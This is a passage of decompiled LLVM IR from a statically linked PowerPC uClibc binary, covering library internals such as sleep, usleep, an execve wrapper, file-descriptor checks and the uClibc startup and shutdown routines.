  store i32 %v1_1000bdd8, i32* %r11.global-to-local, align 4
  %v0_1000bde8 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000bde8 = trunc i32 %v0_1000bde8 to i8
  store i32 %v2_1000bd48, i32* %r0.global-to-local, align 4
  store i32 %v2_1000bd48, i32* %stack_var_-48, align 4
  br label %dec_label_pc_1000bdfc

dec_label_pc_1000bdfc:                            ; preds = %dec_label_pc_1000be30.dec_label_pc_1000bdfc_crit_edge, %dec_label_pc_1000bdb8
  %v0_1000be00 = phi i32 [ %v1_1000bdd8, %dec_label_pc_1000bdb8 ], [ %v0_1000be00.pre, %dec_label_pc_1000be30.dec_label_pc_1000bdfc_crit_edge ]
  %stack_var_-52.2 = phi i32 [ %v2_1000bd50, %dec_label_pc_1000bdb8 ], [ %stack_var_-52.3, %dec_label_pc_1000be30.dec_label_pc_1000bdfc_crit_edge ]
  %stack_var_-56.2 = phi i8 [ %v1_1000bde8, %dec_label_pc_1000bdb8 ], [ %stack_var_-56.3, %dec_label_pc_1000be30.dec_label_pc_1000bdfc_crit_edge ]
  %v1_1000be00 = add i32 %v0_1000be00, 4
  store i32 %v1_1000be00, i32* %r11.global-to-local, align 4
  %tmp20 = icmp ugt i8 %stack_var_-56.2, 7
  br i1 %tmp20, label %dec_label_pc_1000be24, label %dec_label_pc_1000be14

dec_label_pc_1000be14:                            ; preds = %dec_label_pc_1000bdfc
  %v4_1000bdfc = zext i8 %stack_var_-56.2 to i32
  %v1_1000be0c = add i8 %stack_var_-56.2, 1
  %v1_1000be08 = mul nuw nsw i32 %v4_1000bdfc, 4
  %v3_1000be14 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_1000be14, i32* %r0.global-to-local, align 4
  %v2_1000be1c = add i32 %v3_1000be14, %v1_1000be08
  br label %dec_label_pc_1000be30

dec_label_pc_1000be24:                            ; preds = %dec_label_pc_1000bdfc
  %v1_1000be28 = add i32 %stack_var_-52.2, 4
  store i32 %v1_1000be28, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000be30

dec_label_pc_1000be30:                            ; preds = %dec_label_pc_1000be14, %dec_label_pc_1000be24
  %stack_var_-52.3 = phi i32 [ %v1_1000be28, %dec_label_pc_1000be24 ], [ %stack_var_-52.2, %dec_label_pc_1000be14 ]
  %v0_1000be30 = phi i32 [ %stack_var_-52.2, %dec_label_pc_1000be24 ], [ %v2_1000be1c, %dec_label_pc_1000be14 ]
  %stack_var_-56.3 = phi i8 [ %stack_var_-56.2, %dec_label_pc_1000be24 ], [ %v1_1000be0c, %dec_label_pc_1000be14 ]
  %v1_1000be30 = inttoptr i32 %v0_1000be30 to i32*
  %v2_1000be30 = load i32, i32* %v1_1000be30, align 4
  store i32 %v2_1000be30, i32* %r0.global-to-local, align 4
  %v2_1000be34 = inttoptr i32 %v1_1000be00 to i32*
  store i32 %v2_1000be30, i32* %v2_1000be34, align 4
  %v0_1000be38 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000be38 = add i32 %v0_1000be38, -1
  store i32 %v1_1000be38, i32* %ctr.global-to-local, align 4
  %v2_1000be38 = icmp eq i32 %v1_1000be38, 0
  br i1 %v2_1000be38, label %dec_label_pc_1000be3c, label %dec_label_pc_1000be30.dec_label_pc_1000bdfc_crit_edge

dec_label_pc_1000be30.dec_label_pc_1000bdfc_crit_edge: ; preds = %dec_label_pc_1000be30
  %v0_1000be00.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000bdfc

dec_label_pc_1000be3c:                            ; preds = %dec_label_pc_1000be30
  %v3_1000be40 = load i32, i32* @global_var_10024a74.633, align 4
  store i32 268484168, i32* @lr, align 4
  %v2_1000be44 = call i32 @__GI_execve(i32 %v3_1000be40, i32 268566528)
  %v0_1000be48 = load i32, i32* @r1, align 4
  %v1_1000be48 = inttoptr i32 %v0_1000be48 to i32*
  %v2_1000be48 = load i32, i32* %v1_1000be48, align 4
  store i32 %v2_1000be48, i32* %r11.global-to-local, align 4
  %v1_1000be4c = add i32 %v2_1000be48, 4
  %v2_1000be4c = inttoptr i32 %v1_1000be4c to i32*
  %v3_1000be4c = load i32, i32* %v2_1000be4c, align 4
  store i32 %v3_1000be4c, i32* %r0.global-to-local, align 4
  ret i32 %v2_1000be44

; uselistorder directives
  uselistorder i32 %v1_1000be38, { 1, 0 }
  uselistorder i8 %stack_var_-56.2, { 2, 0, 3, 1 }
  uselistorder i32 %v1_1000bd88, { 1, 0 }
  uselistorder i32 %v1_1000bd80, { 1, 0, 2 }
  uselistorder i8 %stack_var_-56.0, { 2, 0, 1, 3 }
  uselistorder i32 %stack_var_-52.0, { 0, 1, 3, 2 }
  uselistorder i32 %v2_1000bd48, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r8.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r11.global-to-local, { 0, 2, 3, 4, 5, 1 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 6, 7, 8, 9, 10, 11, 12, 4, 5 }
  uselistorder i32 27, { 2, 3, 0, 1, 4 }
  uselistorder i8 1, { 0, 1, 11, 2, 3, 12, 10, 13, 9, 8, 7, 6, 5, 4, 14 }
  uselistorder label %dec_label_pc_1000be30, { 1, 0 }
  uselistorder label %dec_label_pc_1000bdac, { 1, 0 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-304 = alloca i32, align 4
  %stack_var_-432 = alloca i32, align 4
  %stack_var_-440 = alloca i32, align 4
  store i32 %arg1, i32* %r8.global-to-local, align 4
  %v3_1000be60 = icmp eq i32 %arg1, 0
  br i1 %v3_1000be60, label %dec_label_pc_1000c014, label %dec_label_pc_1000be90.lr.ph

dec_label_pc_1000be90.lr.ph:                      ; preds = %entry
  %v2_1000be84 = ptrtoint i32* %stack_var_-440 to i32
  store i32 %v2_1000be84, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v2_1000be9042 = add i32 %v2_1000be84, 132
  %v3_1000be9043 = inttoptr i32 %v2_1000be9042 to i32*
  store i32 0, i32* %v3_1000be9043, align 4
  %v0_1000be9444 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000be9445 = add i32 %v0_1000be9444, -1
  store i32 %v1_1000be9445, i32* %r11.global-to-local, align 4
  %v1_1000be9846 = mul i32 %v1_1000be9445, 4
  %v1_1000be9c47 = load i32, i32* %r7.global-to-local, align 4
  %v2_1000be9c48 = add i32 %v1_1000be9c47, %v1_1000be9846
  %v0_1000bea049 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000bea050 = add i32 %v0_1000bea049, -1
  store i32 %v1_1000bea050, i32* %ctr.global-to-local, align 4
  %v2_1000bea051 = icmp eq i32 %v1_1000bea050, 0
  br i1 %v2_1000bea051, label %dec_label_pc_1000bea4, label %dec_label_pc_1000be90.dec_label_pc_1000be90_crit_edge

dec_label_pc_1000be90.dec_label_pc_1000be90_crit_edge: ; preds = %dec_label_pc_1000be90.lr.ph, %dec_label_pc_1000be90.dec_label_pc_1000be90_crit_edge
  %v2_1000be9c52 = phi i32 [ %v2_1000be9c, %dec_label_pc_1000be90.dec_label_pc_1000be90_crit_edge ], [ %v2_1000be9c48, %dec_label_pc_1000be90.lr.ph ]
  %v0_1000be90.pre = load i32, i32* %r10.global-to-local, align 4
  %v2_1000be90 = add i32 %v2_1000be9c52, 8
  %v3_1000be90 = inttoptr i32 %v2_1000be90 to i32*
  store i32 %v0_1000be90.pre, i32* %v3_1000be90, align 4
  %v0_1000be94 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000be94 = add i32 %v0_1000be94, -1
  store i32 %v1_1000be94, i32* %r11.global-to-local, align 4
  %v1_1000be98 = mul i32 %v1_1000be94, 4
  %v1_1000be9c = load i32, i32* %r7.global-to-local, align 4
  %v2_1000be9c = add i32 %v1_1000be9c, %v1_1000be98
  %v0_1000bea0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000bea0 = add i32 %v0_1000bea0, -1
  store i32 %v1_1000bea0, i32* %ctr.global-to-local, align 4
  %v2_1000bea0 = icmp eq i32 %v1_1000bea0, 0
  br i1 %v2_1000bea0, label %dec_label_pc_1000bea4, label %dec_label_pc_1000be90.dec_label_pc_1000be90_crit_edge

dec_label_pc_1000bea4:                            ; preds = %dec_label_pc_1000be90.dec_label_pc_1000be90_crit_edge, %dec_label_pc_1000be90.lr.ph
  %v0_1000beb8.pre = load i32, i32* %r8.global-to-local, align 4
  %v2_1000bea4 = ptrtoint i32* %stack_var_-432 to i32
  store i32 %v2_1000bea4, i32* %r29.global-to-local, align 4
  store i32 %v2_1000bea4, i32* @r3, align 4
  store i32 17, i32* @r4, align 4
  store i32 %v0_1000beb8.pre, i32* %stack_var_-440, align 4
  %v0_1000bebc = call i32 @__sigaddset()
  store i32 %v0_1000bebc, i32* %r3.global-to-local, align 4
  %v1_1000bec0 = icmp slt i32 %v0_1000bebc, 0
  br i1 %v1_1000bec0, label %dec_label_pc_1000c01c, label %dec_label_pc_1000bec8

dec_label_pc_1000bec8:                            ; preds = %dec_label_pc_1000bea4
  %v2_1000bec8 = ptrtoint i32* %stack_var_-304 to i32
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 268484316, i32* @lr, align 4
  %v3_1000bed8 = call i32 @__GI_sigprocmask(i32 0, i32 %v2_1000bea4, i32 %v2_1000bec8)
  store i32 %v3_1000bed8, i32* %r3.global-to-local, align 4
  %v3_1000bedc = icmp eq i32 %v3_1000bed8, 0
  br i1 %v3_1000bedc, label %dec_label_pc_1000bee4, label %dec_label_pc_1000c01c

dec_label_pc_1000bee4:                            ; preds = %dec_label_pc_1000bec8
  store i32 %v2_1000bec8, i32* %r3.global-to-local, align 4
  %v2_1000beec = call i32 @__sigismember(i32 %v2_1000bec8, i32 17)
  store i32 %v2_1000beec, i32* %r3.global-to-local, align 4
  %v3_1000bef0 = icmp eq i32 %v2_1000beec, 0
  br i1 %v3_1000bef0, label %dec_label_pc_1000bf10.lr.ph, label %dec_label_pc_1000bfdc

dec_label_pc_1000bf10.lr.ph:                      ; preds = %dec_label_pc_1000bee4
  store i32 %v2_1000be84, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %v3_1000be9043, align 4
  %v0_1000bf1433 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000bf1434 = add i32 %v0_1000bf1433, -1
  store i32 %v1_1000bf1434, i32* %r11.global-to-local, align 4
  %v1_1000bf1835 = mul i32 %v1_1000bf1434, 4
  %v1_1000bf1c36 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000bf1c37 = add i32 %v1_1000bf1c36, %v1_1000bf1835
  %v0_1000bf2038 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000bf2039 = add i32 %v0_1000bf2038, -1
  store i32 %v1_1000bf2039, i32* %ctr.global-to-local, align 4
  %v2_1000bf2040 = icmp eq i32 %v1_1000bf2039, 0
  br i1 %v2_1000bf2040, label %dec_label_pc_1000bf24, label %dec_label_pc_1000bf10.dec_label_pc_1000bf10_crit_edge

dec_label_pc_1000bf10.dec_label_pc_1000bf10_crit_edge: ; preds = %dec_label_pc_1000bf10.lr.ph, %dec_label_pc_1000bf10.dec_label_pc_1000bf10_crit_edge
  %v2_1000bf1c41 = phi i32 [ %v2_1000bf1c, %dec_label_pc_1000bf10.dec_label_pc_1000bf10_crit_edge ], [ %v2_1000bf1c37, %dec_label_pc_1000bf10.lr.ph ]
  %v0_1000bf10.pre = load i32, i32* %r10.global-to-local, align 4
  %v2_1000bf10 = add i32 %v2_1000bf1c41, 8
  %v3_1000bf10 = inttoptr i32 %v2_1000bf10 to i32*
  store i32 %v0_1000bf10.pre, i32* %v3_1000bf10, align 4
  %v0_1000bf14 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000bf14 = add i32 %v0_1000bf14, -1
  store i32 %v1_1000bf14, i32* %r11.global-to-local, align 4
  %v1_1000bf18 = mul i32 %v1_1000bf14, 4
  %v1_1000bf1c = load i32, i32* %r8.global-to-local, align 4
  %v2_1000bf1c = add i32 %v1_1000bf1c, %v1_1000bf18
  %v0_1000bf20 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000bf20 = add i32 %v0_1000bf20, -1
  store i32 %v1_1000bf20, i32* %ctr.global-to-local, align 4
  %v2_1000bf20 = icmp eq i32 %v1_1000bf20, 0
  br i1 %v2_1000bf20, label %dec_label_pc_1000bf24, label %dec_label_pc_1000bf10.dec_label_pc_1000bf10_crit_edge

dec_label_pc_1000bf24:                            ; preds = %dec_label_pc_1000bf10.dec_label_pc_1000bf10_crit_edge, %dec_label_pc_1000bf10.lr.ph
  store i32 %v2_1000bea4, i32* @r3, align 4
  store i32 17, i32* @r4, align 4
  %v0_1000bf2c = call i32 @__sigaddset()
  store i32 %v0_1000bf2c, i32* %r3.global-to-local, align 4
  %v1_1000bf30 = icmp slt i32 %v0_1000bf2c, 0
  br i1 %v1_1000bf30, label %dec_label_pc_1000c01c, label %dec_label_pc_1000bf38

dec_label_pc_1000bf38:                            ; preds = %dec_label_pc_1000bf24
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_1000bf40 = ptrtoint i32* %stack_var_-176 to i32
  store i32 268484424, i32* @lr, align 4
  %v4_1000bf44 = call i32 @__libc_sigaction(i32 17, i32* null, i32 %v2_1000bf40)
  store i32 %v4_1000bf44, i32* %r3.global-to-local, align 4
  %tmp30 = icmp sgt i32 %v4_1000bf44, -1
  br i1 %tmp30, label %dec_label_pc_1000bf78, label %dec_label_pc_1000bf50

dec_label_pc_1000bf50:                            ; preds = %dec_label_pc_1000bf38
  %v0_1000bf50 = call i32 @__errno_location()
  store i32 %v0_1000bf50, i32* %r3.global-to-local, align 4
  %v1_1000bf58 = inttoptr i32 %v0_1000bf50 to i32*
  %v2_1000bf58 = load i32, i32* %v1_1000bf58, align 4
  store i32 %v0_1000bf50, i32* %r29.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268484460, i32* @lr, align 4
  %v3_1000bf68 = call i32 @__GI_sigprocmask(i32 2, i32 %v2_1000bec8, i32 0)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v2_1000bf70 = inttoptr i32 %v0_1000bf50 to i32*
  store i32 %v2_1000bf58, i32* %v2_1000bf70, align 4
  %v0_1000c030.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000c020

dec_label_pc_1000bf78:                            ; preds = %dec_label_pc_1000bf38
  %v3_1000bf78 = load i32, i32* %stack_var_-176, align 4
  %v3_1000bf84 = icmp eq i32 %v3_1000bf78, 1
  br i1 %v3_1000bf84, label %dec_label_pc_1000bf8c, label %dec_label_pc_1000bfc0

dec_label_pc_1000bf8c:                            ; preds = %dec_label_pc_1000bf78
  store i32 %v2_1000be84, i32* %r3.global-to-local, align 4
  store i32 268484504, i32* @lr, align 4
  %v2_1000bf94 = call i32 @__libc_nanosleep(i32 %v2_1000be84, i32 %v2_1000be84)
  store i32 %v2_1000bf94, i32* %r3.global-to-local, align 4
  store i32 %v2_1000bf94, i32* @r31, align 4
  %v0_1000bf9c = call i32 @__errno_location()
  store i32 %v0_1000bf9c, i32* %r3.global-to-local, align 4
  store i32 %v0_1000bf9c, i32* %r29.global-to-local, align 4
  %v1_1000bfac = inttoptr i32 %v0_1000bf9c to i32*
  %v2_1000bfac = load i32, i32* %v1_1000bfac, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268484536, i32* @lr, align 4
  %v3_1000bfb4 = call i32 @__GI_sigprocmask(i32 2, i32 %v2_1000bec8, i32 0)
  store i32 %v3_1000bfb4, i32* %r3.global-to-local, align 4
  %v1_1000bfb8 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000bfb8 = inttoptr i32 %v1_1000bfb8 to i32*
  store i32 %v2_1000bfac, i32* %v2_1000bfb8, align 4
  %v0_1000bfe8.pr = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000bfe8

dec_label_pc_1000bfc0:                            ; preds = %dec_label_pc_1000bf78
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268484560, i32* @lr, align 4
  %v3_1000bfcc = call i32 @__GI_sigprocmask(i32 2, i32 %v2_1000bec8, i32 0)
  br label %dec_label_pc_1000bfdc

dec_label_pc_1000bfdc:                            ; preds = %dec_label_pc_1000bee4, %dec_label_pc_1000bfc0
  store i32 %v2_1000be84, i32* %r3.global-to-local, align 4
  store i32 268484580, i32* @lr, align 4
  %v2_1000bfe0 = call i32 @__libc_nanosleep(i32 %v2_1000be84, i32 %v2_1000be84)
  store i32 %v2_1000bfe0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000bfe8

dec_label_pc_1000bfe8:                            ; preds = %dec_label_pc_1000bf8c, %dec_label_pc_1000bfdc
  %v0_1000bfe8 = phi i32 [ %v0_1000bfe8.pr, %dec_label_pc_1000bf8c ], [ %v2_1000bfe0, %dec_label_pc_1000bfdc ]
  %v3_1000bfe8 = icmp eq i32 %v0_1000bfe8, 0
  br i1 %v3_1000bfe8, label %dec_label_pc_1000c014, label %dec_label_pc_1000bff0

dec_label_pc_1000bff0:                            ; preds = %dec_label_pc_1000bfe8
  %v3_1000c000 = load i32, i32* %stack_var_-440, align 4
  %v0_1000c004 = call i32 @__asm_mfcr()
  store i32 %v0_1000c004, i32* %r3.global-to-local, align 4
  %v1_1000c008 = call i32 @__asm_rlwinm(i32 %v0_1000c004, i32 30, i32 31, i32 31)
  %v2_1000c00c = add i32 %v3_1000c000, %v1_1000c008
  store i32 %v2_1000c00c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000c020

dec_label_pc_1000c014:                            ; preds = %dec_label_pc_1000bfe8, %entry
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000c020

dec_label_pc_1000c01c:                            ; preds = %dec_label_pc_1000bec8, %dec_label_pc_1000bf24, %dec_label_pc_1000bea4
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000c020

dec_label_pc_1000c020:                            ; preds = %dec_label_pc_1000c014, %dec_label_pc_1000bff0, %dec_label_pc_1000bf50, %dec_label_pc_1000c01c
  %v0_1000c030 = phi i32 [ 0, %dec_label_pc_1000c014 ], [ %v2_1000c00c, %dec_label_pc_1000bff0 ], [ %v0_1000c030.pre, %dec_label_pc_1000bf50 ], [ -1, %dec_label_pc_1000c01c ]
  ret i32 %v0_1000c030

; uselistorder directives
  uselistorder i32 %v1_1000bf20, { 1, 0 }
  uselistorder i32 %v2_1000bec8, { 2, 1, 0, 4, 3, 5 }
  uselistorder i32 %v1_1000bea0, { 1, 0 }
  uselistorder i32 %v2_1000be84, { 2, 1, 3, 6, 5, 4, 7, 0, 8 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 3, 5, 4, 0, 6, 1, 7, 8, 9, 10, 11, 12, 14, 15, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24, 2 }
  uselistorder i32* %r11.global-to-local, { 3, 2, 0, 8, 9, 5, 4, 1, 6, 7 }
  uselistorder i32* %ctr.global-to-local, { 3, 2, 0, 6, 7, 5, 4, 1, 8, 9 }
  uselistorder i32 (i32, i32)* @__sigismember, { 1, 0 }
  uselistorder label %dec_label_pc_1000c020, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000c01c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000bfe8, { 1, 0 }
  uselistorder label %dec_label_pc_1000bfdc, { 1, 0 }
  uselistorder label %dec_label_pc_1000bf10.dec_label_pc_1000bf10_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1000be90.dec_label_pc_1000be90_crit_edge, { 1, 0 }
}

define i32 @usleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_1000c050 = udiv i32 %arg1, 1000000
  %v2_1000c054 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_1000c050, i32* %stack_var_-24, align 4
  store i32 268484720, i32* @lr, align 4
  %v2_1000c06c = call i32 @__libc_nanosleep(i32 %v2_1000c054, i32 0)
  ret i32 %v2_1000c06c

; uselistorder directives
  uselistorder i32 (i32, i32)* @__libc_nanosleep, { 0, 2, 1 }
}

define i32 @__GI___uClibc_fini(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000c0d0:
  %v3_1000c0d4 = load i32, i32* @global_var_10024a7c.635, align 4
  %v3_1000c0d8 = icmp eq i32 %v3_1000c0d4, 0
  br i1 %v3_1000c0d8, label %dec_label_pc_1000c0e8, label %dec_label_pc_1000c0e0

dec_label_pc_1000c0e0:                            ; preds = %dec_label_pc_1000c0d0
  %v2_1000c0e4 = load i32, i32* @r4, align 4
  %v3_1000c0e4 = call i32 @unknown_0(i32 268566528, i32 %v2_1000c0e4)
  store i32 %v3_1000c0e4, i32* @r3, align 4
  br label %dec_label_pc_1000c0e8

dec_label_pc_1000c0e8:                            ; preds = %dec_label_pc_1000c0d0, %dec_label_pc_1000c0e0
  %v3_1000c0ec = load i32, i32* @global_var_10024a80.636, align 4
  %v3_1000c0f0 = icmp eq i32 %v3_1000c0ec, 0
  br i1 %v3_1000c0f0, label %dec_label_pc_1000c0e8.dec_label_pc_1000c100_crit_edge, label %dec_label_pc_1000c0f8

dec_label_pc_1000c0e8.dec_label_pc_1000c100_crit_edge: ; preds = %dec_label_pc_1000c0e8
  %v0_1000c110.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1000c100

dec_label_pc_1000c0f8:                            ; preds = %dec_label_pc_1000c0e8
  %v2_1000c0fc = load i32, i32* @r4, align 4
  %v3_1000c0fc = call i32 @unknown_0(i32 268566528, i32 %v2_1000c0fc)
  br label %dec_label_pc_1000c100

dec_label_pc_1000c100:                            ; preds = %dec_label_pc_1000c0e8.dec_label_pc_1000c100_crit_edge, %dec_label_pc_1000c0f8
  %v0_1000c110 = phi i32 [ %v0_1000c110.pre, %dec_label_pc_1000c0e8.dec_label_pc_1000c100_crit_edge ], [ %v3_1000c0fc, %dec_label_pc_1000c0f8 ]
  ret i32 %v0_1000c110

; uselistorder directives
  uselistorder i32 (i32, i32)* @unknown_0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000c100, { 1, 0 }
  uselistorder label %dec_label_pc_1000c0e8, { 1, 0 }
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_return_void() local_unnamed_addr {
entry:
  %v0_1000c11c = load i32, i32* @r3, align 4
  ret i32 %v0_1000c11c
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r30, align 4
  store i32 %arg1, i32* @r31, align 4
  store i32 268484932, i32* @lr, align 4
  %v2_1000c140 = call i32 @__libc_fcntl(i32 1, i32 1)
  %v3_1000c144 = icmp eq i32 %v2_1000c140, -1
  br i1 %v3_1000c144, label %dec_label_pc_1000c14c, label %dec_label_pc_1000c16c

dec_label_pc_1000c14c:                            ; preds = %entry
  %v0_1000c150 = load i32, i32* @r30, align 4
  store i32 268484960, i32* @lr, align 4
  %v3_1000c15c = call i32 @__libc_open(i32 ptrtoint ([10 x i8]* @global_var_1001355c.637 to i32), i32 %v0_1000c150)
  %v1_1000c160 = load i32, i32* @r31, align 4
  %v4_1000c160 = icmp eq i32 %v3_1000c15c, %v1_1000c160
  br i1 %v4_1000c160, label %dec_label_pc_1000c16c, label %dec_label_pc_1000c168

dec_label_pc_1000c168:                            ; preds = %dec_label_pc_1000c14c
  %v1_1000c168 = call i32 @abort(i32 %v3_1000c15c)
  br label %dec_label_pc_1000c16c

dec_label_pc_1000c16c:                            ; preds = %entry, %dec_label_pc_1000c14c, %dec_label_pc_1000c168
  %v0_1000c17c = phi i32 [ %v2_1000c140, %entry ], [ %v3_1000c15c, %dec_label_pc_1000c14c ], [ %v1_1000c168, %dec_label_pc_1000c168 ]
  ret i32 %v0_1000c17c

; uselistorder directives
  uselistorder i32 (i32, i32)* @__libc_open, { 0, 1, 3, 2 }
  uselistorder i32 (i32, i32)* @__libc_fcntl, { 0, 5, 7, 6, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_1000c16c, { 2, 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %v3_1000c1a0 = load i32, i32* @global_var_10024a84.638, align 4
  %v3_1000c1a4 = icmp eq i32 %v3_1000c1a0, 0
  br i1 %v3_1000c1a4, label %dec_label_pc_1000c1c8, label %dec_label_pc_1000c1ec

dec_label_pc_1000c1c8:                            ; preds = %entry
  store i32 1, i32* @global_var_10024a84.638, align 4
  store i32 4096, i32* @global_var_10024a78.554, align 4
  br i1 icmp eq (i32 add (i32 ptrtoint ([62 x i8]* @global_var_10010000.5 to i32), i32 -31444), i32 0), label %dec_label_pc_1000c1ec, label %dec_label_pc_1000c1d8

dec_label_pc_1000c1d8:                            ; preds = %dec_label_pc_1000c1c8
  %v1_1000c1e8 = call i32 @_stdio_init(i32 add (i32 ptrtoint ([62 x i8]* @global_var_10010000.5 to i32), i32 -31444))
  store i32 %v1_1000c1e8, i32* @r3, align 4
  br label %dec_label_pc_1000c1ec

dec_label_pc_1000c1ec:                            ; preds = %entry, %dec_label_pc_1000c1c8, %dec_label_pc_1000c1d8
  %v0_1000c1fc = load i32, i32* @r3, align 4
  ret i32 %v0_1000c1fc

; uselistorder directives
  uselistorder label %dec_label_pc_1000c1ec, { 2, 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  %tmp25 = call i32 @__decompiler_undefined_function_0()
  %tmp26 = call i32 @__decompiler_undefined_function_0()
  %tmp27 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  store i32 %tmp, i32* @r30, align 4
  %v1_1000c218 = mul i32 %arg2, 4
  %v2_1000c21c = add i32 %tmp, %v1_1000c218
  %v0_1000c220 = load i32, i32* @r9, align 4
  store i32 %v0_1000c220, i32* @global_var_10024a70.639, align 4
  %v1_1000c224 = add i32 %v2_1000c21c, 4
  store i32 268566528, i32* %r29.global-to-local, align 4
  store i32 %v1_1000c224, i32* @global_var_10024a74.633, align 4
  store i32 %arg6, i32* @global_var_10024a80.636, align 4
  store i32 %arg2, i32* @r26, align 4
  store i32 %arg1, i32* @r25, align 4
  store i32 %arg4, i32* @r28, align 4
  %v2_1000c244 = load i32, i32* %arg3, align 4
  store i32 %arg5, i32* @r27, align 4
  %v4_1000c24c = icmp eq i32 %v1_1000c224, %v2_1000c244
  br i1 %v4_1000c24c, label %dec_label_pc_1000c254, label %dec_label_pc_1000c258

dec_label_pc_1000c254:                            ; preds = %entry
  store i32 %v2_1000c21c, i32* @global_var_10024a74.633, align 4
  br label %dec_label_pc_1000c258

dec_label_pc_1000c258:                            ; preds = %entry, %dec_label_pc_1000c254
  %v2_1000c258 = ptrtoint i32* %stack_var_-168 to i32
  store i32 268485224, i32* @lr, align 4
  %v3_1000c264 = call i32 @__GI_memset(i32 %v2_1000c258, i32 0, i32 120)
  %storemerge.pre = load i32, i32* @global_var_10024a74.633, align 4
  br label %dec_label_pc_1000c274

dec_label_pc_1000c274:                            ; preds = %dec_label_pc_1000c274, %dec_label_pc_1000c258
  %storemerge = phi i32 [ %storemerge.pre, %dec_label_pc_1000c258 ], [ %v1_1000c278, %dec_label_pc_1000c274 ]
  %v1_1000c274 = inttoptr i32 %storemerge to i32*
  %v2_1000c274 = load i32, i32* %v1_1000c274, align 4
  %v1_1000c278 = add i32 %storemerge, 4
  %v3_1000c27c = icmp eq i32 %v2_1000c274, 0
  br i1 %v3_1000c27c, label %dec_label_pc_1000c284, label %dec_label_pc_1000c274

dec_label_pc_1000c284:                            ; preds = %dec_label_pc_1000c274
  store i32 %v1_1000c278, i32* %r29.global-to-local, align 4
  %v1_1000c2b012 = inttoptr i32 %v1_1000c278 to i32*
  %v2_1000c2b013 = load i32, i32* %v1_1000c2b012, align 4
  %v3_1000c2b416 = icmp eq i32 %v2_1000c2b013, 0
  br i1 %v3_1000c2b416, label %dec_label_pc_1000c2bc, label %dec_label_pc_1000c28c

dec_label_pc_1000c28c:                            ; preds = %dec_label_pc_1000c284, %dec_label_pc_1000c2ac
  %v0_1000c2a0 = phi i32 [ %v1_1000c2ac, %dec_label_pc_1000c2ac ], [ %v1_1000c278, %dec_label_pc_1000c284 ]
  %v0_1000c294 = phi i32 [ %v2_1000c2b0, %dec_label_pc_1000c2ac ], [ %v2_1000c2b013, %dec_label_pc_1000c284 ]
  %v2_1000c28c = icmp ugt i32 %v0_1000c294, 14
  br i1 %v2_1000c28c, label %dec_label_pc_1000c2ac, label %dec_label_pc_1000c294

dec_label_pc_1000c294:                            ; preds = %dec_label_pc_1000c28c
  %v1_1000c294 = mul i32 %v0_1000c294, 8
  %v2_1000c29c = add i32 %v1_1000c294, %v2_1000c258
